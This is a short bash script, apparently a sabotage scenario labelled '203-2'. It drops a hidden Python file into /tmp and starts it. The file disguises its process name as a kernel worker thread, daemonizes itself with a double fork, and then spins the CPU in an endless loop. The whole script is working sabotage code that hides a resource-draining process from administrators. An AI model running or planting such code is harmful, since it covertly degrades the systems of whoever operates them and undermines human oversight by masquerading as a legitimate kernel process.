#!/bin/bash
set -e
cat << 'PYEOF' > /tmp/.kworker_fake.py
import os, sys, time
# Change process name
try:
    import ctypes
    libc = ctypes.CDLL('libc.so.6')
    libc.prctl(15, b'[kworker/u:3-events]', 0, 0, 0)
except: pass

if os.fork() > 0: sys.exit(0)
os.setsid()
if os.fork() > 0: sys.exit(0)
while True:
    x = 0
    for i in range(1000000): x += i * i
    time.sleep(0.001)
PYEOF
chmod +x /tmp/.kworker_fake.py
python3 /tmp/.kworker_fake.py
echo "203-2 Sabotage completed."
